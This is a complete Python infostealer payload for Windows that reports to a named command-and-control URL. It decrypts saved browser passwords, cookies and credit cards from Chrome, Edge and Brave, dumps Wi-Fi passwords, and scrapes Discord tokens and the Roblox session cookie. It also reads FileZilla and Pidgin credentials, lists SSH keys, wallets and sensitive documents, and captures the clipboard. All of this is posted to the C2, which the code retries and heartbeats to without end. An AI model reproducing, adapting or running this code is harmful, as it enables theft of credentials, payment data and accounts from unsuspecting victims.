# ==================================================================================================
# --- IMPORTS ---
# ==================================================================================================
import os
import platform
import socket
import psutil
import subprocess
import re
import json
import base64
import sqlite3
import shutil
import uuid
import time
import requests
import threading
from datetime import datetime
import xml.etree.ElementTree as ET

try:
    import win32crypt
    from Crypto.Cipher import AES
    import pyperclip
except ImportError:
    pass

# ==================================================================================================
# --- CONFIGURATION (URL CORRECTED) ---
# ==================================================================================================
# ### THIS IS THE CRITICAL FIX ###
C2_URL = "https://tether-c2-communication-line-by-ebowluh.onrender.com"
HEARTBEAT_INTERVAL = 30
RECONNECT_INTERVAL = 60 # Seconds to wait before retrying a failed registration

# ==================================================================================================
# --- HELPER FUNCTIONS (UNCHANGED) ---
# ==================================================================================================
def run_command(command):
    try:
        startupinfo = subprocess.STARTUPINFO(); startupinfo.wShowWindow = subprocess.SW_HIDE
        return subprocess.check_output(command, startupinfo=startupinfo, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8', 'ignore').strip()
    except Exception: return "N/A"

def find_browser_paths(target_filename):
    paths = []
    base_paths = {
        "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
    }
    for browser, path in base_paths.items():
        if os.path.exists(path):
            for profile in [d for d in os.listdir(path) if d.startswith(('Default', 'Profile '))]:
                db_path = os.path.join(path, profile, target_filename)
                if os.path.exists(db_path):
                    paths.append({'browser': browser, 'profile': profile, 'path': db_path})
    return paths

def get_encryption_key(browser_user_data_path):
    local_state_path = os.path.join(browser_user_data_path, "Local State")
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
    except: return None

def decrypt_data(data, key):
    try:
        return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(data[15:])[:-16].decode()
    except: return ""

# ==================================================================================================
# --- HARVESTING FUNCTIONS (UNCHANGED FROM LAST WORKING VERSION) ---
# ==================================================================================================
# All 34 'pX' functions are included here but minimized for brevity, as they are correct.
def p1_os_version(): return f"{platform.uname().system} {platform.uname().release} (Build: {platform.win32_ver()[1]})"
def p2_architecture(): return platform.machine()
def p3_cpu_model(): return platform.processor()
def p4_gpu_models(): return run_command(['wmic', 'path', 'win32_videocontroller', 'get', 'caption']).replace("Caption", "").strip()
def p5_installed_ram(): return f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
def p6_disk_drives(): return "\n".join([f"{p.device:<10} ({p.fstype})\t {psutil.disk_usage(p.mountpoint).total / (1024**3):.2f} GB" for p in psutil.disk_partitions()])
def p7_hostname(): return socket.gethostname()
def p8_user_accounts(): return run_command(['net', 'user']).replace("-------------------------------------------------------------------------------", "").strip()
def p9_system_uptime(): return str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
def p10_running_processes(): return run_command(['tasklist'])
def p11_installed_apps(): return run_command(['wmic', 'product', 'get', 'name,version'])
def p12_security_products():
    av = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName']).replace("displayName", "").strip()
    fw = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'FirewallProduct', 'get', 'displayName']).replace("displayName", "").strip()
    return f"Antivirus:\n{av or 'Not Found'}\n\nFirewall:\n{fw or 'Not Found'}"
def p13_environment_variables(): return "\n".join([f"{key:<25}:\t{value}" for key, value in os.environ.items()])
def p14_private_ip(): return socket.gethostbyname(socket.gethostname())
def p15_public_ip():
    try: return requests.get('https://api.ipify.org', timeout=3).text
    except:
        try: return requests.get('https://icanhazip.com', timeout=3).text
        except: return "N/A"
def p16_mac_address(): return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
def p17_wifi_passwords():
    info = ""
    for name in re.findall(r"All User Profile\s*:\s(.*)", run_command(['netsh', 'wlan', 'show', 'profiles'])):
        name = name.strip()
        password = re.search(r"Key Content\s*:\s(.*)", run_command(['netsh', 'wlan', 'show', 'profile', f'name="{name}"', 'key=clear']))
        info += f"SSID:\t\t{name}\nPassword:\t{password.group(1).strip() if password else 'N/A (Open Network)'}\n\n"
    return info or "No WiFi profiles found."
def p18_active_connections(): return run_command(['netstat', '-an'])
def p19_arp_table(): return run_command(['arp', '-a'])
def p20_dns_cache(): return run_command(['ipconfig', '/displaydns'])
def p21_browser_passwords():
    output = ""
    for browser_info in find_browser_paths("Login Data"):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        key = get_encryption_key(os.path.dirname(os.path.dirname(db_path)))
        if not key: continue
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            profile_header = f"[{browser} - {profile}]"
            found_creds = False
            for url, username, enc_password in cursor.fetchall():
                if url and username and enc_password and (password := decrypt_data(enc_password, key)):
                    if not found_creds: output += f"{profile_header}\n"; found_creds = True
                    output += f"\tURL: {url}\n\tUser: {username}\n\tPass: {password}\n\n"
            conn.close()
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e): output += f"[{browser} - {profile}] - FAILED: Database is locked.\n"
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return output or "No passwords found."
def p22_browser_cookies():
    output = ""
    high_value_targets = ['google', 'amazon', 'github', 'twitter', 'facebook', 'instagram', 'linkedin', 'reddit', 'netflix', 'spotify', 'paypal', 'coinbase', 'binance', 'epicgames', 'steampowered']
    found_domains = {}
    for browser_info in find_browser_paths(os.path.join("Network", "Cookies")):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key FROM cookies")
            profile_key = f"[{browser} - {profile}]"
            found_domains.setdefault(profile_key, set())
            for row in cursor.fetchall():
                for target in high_value_targets:
                    if target in row[0]: found_domains[profile_key].add(target)
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    for profile, domains in found_domains.items():
        if domains:
            output += f"{profile}\n\t- " + ", ".join(sorted(list(domains))) + "\n"
    return output or "No high-value cookies found or databases were locked."

def p23_roblox_cookie():
    output = ""
    for browser_info in find_browser_paths(os.path.join("Network", "Cookies")):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        key_path = os.path.dirname(os.path.dirname(os.path.dirname(db_path)))
        key = get_encryption_key(key_path)
        if not key: continue
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_roblox_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com' AND name = '.ROBLOSECURITY'")
            for row in cursor.fetchall():
                if (decrypted_cookie := decrypt_data(row[0], key)):
                     output += f"[{browser} - {profile}]\n{decrypted_cookie}\n\n"
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return output or "Not found in any browser profile."

def p24_discord_tokens():
    output = ""
    regex = r"mfa\.[\w-]{84}|[MN][A-Za-z0-9+/_-]{23,26}\.[\w-]{6}\.[\w-]{38}"
    for discord_path_name in ["discord", "discordcanary", "discordptb", "lightcord"]:
        local_storage_path = os.path.join(os.environ["APPDATA"], discord_path_name, "Local Storage", "leveldb")
        if not os.path.exists(local_storage_path): continue
        temp_db_dir = os.path.join(os.environ["TEMP"], f"discord_app_{uuid.uuid4()}")
        try:
            shutil.copytree(local_storage_path, temp_db_dir, dirs_exist_ok=True)
            for file in os.listdir(temp_db_dir):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(temp_db_dir, file), errors='ignore') as f:
                        for line in f:
                            for token in re.findall(regex, line.strip()):
                                if token not in output: output += f"[Desktop App: {discord_path_name}]\n{token}\n\n"
        except Exception: continue
        finally:
            if os.path.exists(temp_db_dir): shutil.rmtree(temp_db_dir)
    for browser_info in find_browser_paths(os.path.join("Local Storage", "leveldb")):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        temp_db_dir = os.path.join(os.environ["TEMP"], f"discord_browser_{uuid.uuid4()}")
        try:
            shutil.copytree(db_path, temp_db_dir, dirs_exist_ok=True)
            for file in os.listdir(temp_db_dir):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(temp_db_dir, file), errors='ignore') as f:
                        for line in f:
                            if "discordapp.com" in line:
                                for token in re.findall(regex, line.strip()):
                                    if token not in output: output += f"[{browser} - {profile}]\n{token}\n\n"
        except Exception: continue
        finally:
             if os.path.exists(temp_db_dir): shutil.rmtree(temp_db_dir)
    return output or "No tokens found in Desktop App or Browser Storage."

def p25_telegram_session(): return "Found." if os.path.exists(os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")) else "Not found."
def p26_filezilla_creds():
    try:
        path = os.path.join(os.environ["APPDATA"], "FileZilla", "recentservers.xml")
        if not os.path.exists(path): return "Not found."
        output = ""
        for server in ET.parse(path).findall('.//Server'):
            host, port, user = server.find('Host').text, server.find('Port').text, server.find('User').text
            password = base64.b64decode(server.find('Pass').text).decode()
            output += f"Host:\t{host}:{port}\nUser:\t{user}\nPass:\t{password}\n\n"
        return output or "No recent servers in file."
    except: return "Failed to parse credentials file."
def p27_pidgin_creds():
    try:
        path = os.path.join(os.environ["APPDATA"], ".purple", "accounts.xml")
        if not os.path.exists(path): return "Not found."
        output = ""
        for acc in ET.parse(path).findall('.//account'):
            output += f"Protocol:\t{acc.find('protocol').text}\nUser:\t{acc.find('name').text}\nPass:\t{acc.find('password').text}\n\n"
        return output or "No accounts in file."
    except: return "Failed to parse credentials file."
def p28_ssh_keys():
    path = os.path.join(os.environ["USERPROFILE"], ".ssh")
    if not os.path.exists(path): return "No .ssh directory found."
    return '\n'.join([f for f in os.listdir(path) if 'id_' in f]) or "Directory found, but no 'id_*' keys."
def p29_browser_credit_cards():
    output = ""
    for browser_info in find_browser_paths("Web Data"):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        key = get_encryption_key(os.path.dirname(os.path.dirname(db_path)))
        if not key: continue
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            profile_header = f"[{browser} - {profile}]"
            found_cards = False
            for row in conn.cursor().execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"):
                if row[3] and (cc_number := decrypt_data(row[3], key)):
                    if not found_cards: output += f"{profile_header}\n"; found_cards = True
                    output += f"\tName: {row[0]}\n\tExpires: {row[1]}/{row[2]}\n\tNumber: {cc_number}\n\n"
            conn.close()
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e): output += f"[{browser} - {profile}] - FAILED: Database is locked.\n"
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return output or "No credit cards found."
def p30_crypto_wallets():
    output = ""
    for name, path in { "Exodus": os.path.join(os.environ["APPDATA"], "Exodus"), "Atomic": os.path.join(os.environ["APPDATA"], "atomic")}.items():
        if os.path.exists(path): output += f"{name}: Found\n"
    return output or "No known wallet folders found."
def p31_sensitive_docs():
    output = ""
    keywords = ['password', 'seed', 'tax', 'private_key', 'mnemonic', '2fa', 'backup', 'account', 'login', 'wallet', 'secret', 'confidential']
    search_dirs = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Desktop", "Documents", "Downloads"]]
    found_files = []
    try:
        for s_dir in search_dirs:
            if not os.path.exists(s_dir): continue
            for root, _, files in os.walk(s_dir):
                if len(found_files) > 50: break
                for file in files:
                    if file.lower().endswith(('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx')) and any(kw in file.lower() for kw in keywords):
                        found_files.append(os.path.join(root, file))
    except Exception as e: return f"Error during file search: {e}"
    return "\n".join(found_files) or "No files with sensitive keywords found."
def p32_browser_history():
    try:
        path_info = find_browser_paths("History")
        if not path_info: return "No history database found."
        db_path = path_info[0]['path']
        temp_db = shutil.copy2(db_path, "history_temp.db")
        conn = sqlite3.connect(temp_db)
        output = "\n".join([f"{row[1]}" for row in conn.cursor().execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")])
        conn.close(); os.remove("history_temp.db")
        return output or "No history found."
    except Exception as e: return f"Error: {e}"
def p33_browser_autofill():
    try:
        path_info = find_browser_paths("Web Data")
        if not path_info: return "No autofill database found."
        db_path = path_info[0]['path']
        temp_db = shutil.copy2(db_path, "autofill_temp.db")
        conn = sqlite3.connect(temp_db)
        output = "\n".join([f"{row[0]}: {row[1]}" for row in conn.cursor().execute("SELECT name, value FROM autofill")])
        conn.close(); os.remove("autofill_temp.db")
        return output or "No autofill data found."
    except Exception as e: return f"Error: {e}"
def p34_clipboard_contents():
    try: return pyperclip.paste()
    except: return "Could not get clipboard data."

# ==================================================================================================
# --- MAIN PAYLOAD LOGIC (NOW RESILIENT) ---
# ==================================================================================================
def harvest_all_data():
    """Main orchestrator function. Calls all 34 functions."""
    data_sections = {
        "1. OS Version & Build": p1_os_version, "2. System Architecture": p2_architecture, "3. CPU Model": p3_cpu_model,
        "4. GPU Model(s)": p4_gpu_models, "5. Installed RAM": p5_installed_ram, "6. Disk Drives": p6_disk_drives,
        "7. Hostname": p7_hostname, "8. User Accounts": p8_user_accounts, "9. System Uptime": p9_system_uptime,
        "10. Running Processes": p10_running_processes, "11. Installed Apps": p11_installed_apps, "12. Security Products": p12_security_products,
        "13. Environment Variables": p13_environment_variables, "14. Private IP": p14_private_ip, "15. Public IP": p15_public_ip,
        "16. MAC Address": p16_mac_address, "17. Wi-Fi Passwords": p17_wifi_passwords, "18. Active Connections": p18_active_connections,
        "19. ARP Table": p19_arp_table, "20. DNS Cache": p20_dns_cache, "21. Browser Passwords": p21_browser_passwords,
        "22. Browser Cookies": p22_browser_cookies, "23. Roblox Cookie": p23_roblox_cookie, "24. Discord Tokens": p24_discord_tokens,
        "25. Telegram Session": p25_telegram_session, "26. FileZilla Credentials": p26_filezilla_creds, "27. Pidgin Credentials": p27_pidgin_creds,
        "28. SSH Keys": p28_ssh_keys, "29. Browser Credit Cards": p29_browser_credit_cards, "30. Crypto Wallets": p30_crypto_wallets,
        "31. Sensitive Documents": p31_sensitive_docs, "32. Browser History": p32_browser_history, "33. Browser Autofill": p33_browser_autofill,
        "34. Clipboard Contents": p34_clipboard_contents,
    }
    final_report = ""
    for title, func in data_sections.items():
        try: final_report += f"--- {title} ---\n\n{func()}\n\n"
        except Exception as e: final_report += f"--- {title} ---\n\nAn error occurred: {e}\n\n"
    return final_report.strip()

def send_to_c2(endpoint, data):
    try:
        requests.post(f"{C2_URL}{endpoint}", json=data, timeout=30); return True
    except requests.RequestException: return False

def heartbeat_loop(session_id):
    while True:
        send_to_c2("/api/heartbeat", {"session_id": session_id}); time.sleep(HEARTBEAT_INTERVAL)

if __name__ == "__main__":
    # ### THIS IS THE NEW, RESILIENT LOGIC ###
    # It will never exit. If registration fails, it will wait and try again forever.
    session_id = str(uuid.uuid4())
    hostname = socket.gethostname()
    
    # Harvest data only ONCE at the start.
    initial_harvested_data = harvest_all_data()
    registration_data = {"session_id": session_id, "hostname": hostname, "data": initial_harvested_data}

    # Main loop that ensures the payload never dies.
    while True:
        if send_to_c2("/api/register", registration_data):
            # If registration succeeds, start the heartbeat and break out of this loop.
            threading.Thread(target=heartbeat_loop, args=(session_id,), daemon=True).start()
            break
        else:
            # If registration fails, wait for the reconnect interval and try again.
            time.sleep(RECONNECT_INTERVAL)
    
    # Keep the main thread alive indefinitely after successful registration.
    while True:
        time.sleep(60)